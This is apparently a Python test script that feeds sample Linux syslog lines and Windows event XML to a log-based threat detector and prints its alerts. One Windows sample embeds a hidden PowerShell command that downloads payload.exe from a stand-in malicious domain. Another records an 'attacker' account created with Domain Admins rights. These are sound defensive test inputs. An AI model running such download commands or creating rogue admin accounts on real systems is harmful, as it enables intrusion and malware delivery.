"""
Test script for threat detection system.
"""

from core.threat_detector import ThreatDetector
from core.linux.linux_log_parser import LinuxLogParser
from core.windows.windows_log_parser import WindowsEventParser

def test_linux_detection():
    """Test Linux threat detection."""
    # Sample Linux log entries
    sample_logs = [
        {
            'raw_message': "Sep 16 15:46:58 server sudo: diana : TTY=pts/0 ; PWD=/home/diana ; USER=root ; COMMAND=/usr/bin/tail -f /var/log/syslog",
            'timestamp': "Sep 16 15:46:58",
            'service': 'sudo'
        },
        {
            'raw_message': "Sep 16 15:46:58 server sshd[4170]: Failed password for admin from 198.51.100.100 port 22",
            'timestamp': "Sep 16 15:46:58",
            'service': 'sshd',
            'ip_addresses': ['198.51.100.100']
        },
        {
            'raw_message': "Sep 16 15:46:58 server sshd[4799]: Invalid user www from 203.0.113.30 port 22",
            'timestamp': "Sep 16 15:46:58",
            'service': 'sshd',
            'ip_addresses': ['203.0.113.30']
        },
        {
            'raw_message': "Sep 16 15:46:59 server kernel: [UFW BLOCK] IN=eth0 OUT= MAC= SRC=198.51.100.50 DST=10.0.0.100 PROTO=TCP DPT=3306",
            'timestamp': "Sep 16 15:46:59",
            'service': 'kernel',
            'ip_addresses': ['198.51.100.50', '10.0.0.100']
        }
    ]

    # Initialize detector
    detector = ThreatDetector()

    print("\nTesting Linux threat detection...")
    print("-" * 80)

    # Process each log entry
    for log in sample_logs:
        # Analyze for threats
        threat_data = detector.analyze_log_entry(log)
        
        if threat_data:
            print(f"[{threat_data['threat_level']}] {threat_data['rule_name']}")
            print(f"Time: {threat_data['timestamp'] if threat_data.get('timestamp') else 'N/A'}")
            print(f"Source: {threat_data['source_ip'] if threat_data.get('source_ip') else 'N/A'}")
            print(f"Summary: {threat_data['summary']}")
            if threat_data.get('all_detected_threats'):
                print("All Detected Threats:")
                for threat in threat_data['all_detected_threats']:
                    print(f"- {threat}")
            print("-" * 80)

def test_windows_detection():
    """Test Windows Event threat detection."""
    # Sample Windows Event logs
    sample_logs = [
        {
            'raw_message': '<Event><System><Provider Name="Microsoft-Windows-Security-Auditing"/><EventID>4625</EventID><TimeCreated SystemTime="2025-10-20T08:15:00Z"/></System><EventData><Data Name="TargetUserName">Administrator</Data><Data Name="IpAddress">203.0.113.45</Data></EventData></Event>',
            'event_type': 'windows_event'
        },
        {
            'raw_message': '<Event><System><Provider Name="Microsoft-Windows-Sysmon"/><EventID>1</EventID><TimeCreated SystemTime="2025-10-20T08:25:00Z"/></System><EventData><Data Name="CommandLine">powershell.exe -nop -w hidden -c "Invoke-WebRequest http://malicious-domain.com/payload.exe -OutFile C:\\Temp\\payload.exe"</Data><Data Name="User">CORP\\svc_monitor</Data></EventData></Event>',
            'event_type': 'windows_event'
        },
        {
            'raw_message': '<Event><System><Provider Name="Microsoft-Windows-Security-Auditing"/><EventID>4720</EventID><TimeCreated SystemTime="2025-10-20T08:32:00Z"/></System><EventData><Data Name="SubjectUserName">CORP\\Administrator</Data><Data Name="NewAccountName">attacker</Data><Data Name="Privileges">Domain Admins</Data></EventData></Event>',
            'event_type': 'windows_event'
        }
    ]

    # Initialize detector
    detector = ThreatDetector()

    print("\nTesting Windows Event threat detection...")
    print("-" * 80)

    # Process each log entry
    for log in sample_logs:
        # Analyze for threats
        threat_data = detector.analyze_log_entry(log)
        
        if threat_data:
            print(f"[{threat_data['threat_level']}] {threat_data['rule_name']}")
            print(f"Time: {threat_data['timestamp'] if threat_data.get('timestamp') else 'N/A'}")
            print(f"Source: {threat_data['source_ip'] if threat_data.get('source_ip') else 'N/A'}")
            print(f"Summary: {threat_data['summary']}")
            if threat_data.get('all_detected_threats'):
                print("All Detected Threats:")
                for threat in threat_data['all_detected_threats']:
                    print(f"- {threat}")
            print("-" * 80)

def main():
    """Run all tests."""
    test_linux_detection()
    test_windows_detection()

if __name__ == "__main__":
    main()